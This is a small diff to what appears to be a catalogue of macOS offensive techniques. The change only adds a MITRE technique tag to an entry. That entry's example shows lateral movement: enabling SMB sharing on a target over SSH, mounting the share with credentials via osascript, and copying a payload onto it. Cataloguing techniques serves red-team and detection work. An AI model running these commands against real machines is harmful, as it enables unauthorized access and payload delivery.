@@ -9,6 +9,8 @@ example_use_cases:
     code: "# On target (via SSH): create share directory, start smbd, create the share\nssh user@<TARGET_IP> 'mkdir -p ~/share && sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smbd.plist && sudo sharing -a /Users/user/share -n share -s 001'\n\n# On attacker: mount the share using osascript and transfer a file\nosascript -e 'mount volume \"smb://user:<PASSWORD>@<TARGET_IP>/share\"'\ncp payload.sh /Volumes/share/"
     tactics:
       - Lateral Movement
+    techniques:
+      - T1570
     tags:
       - smb
       - file-sharing
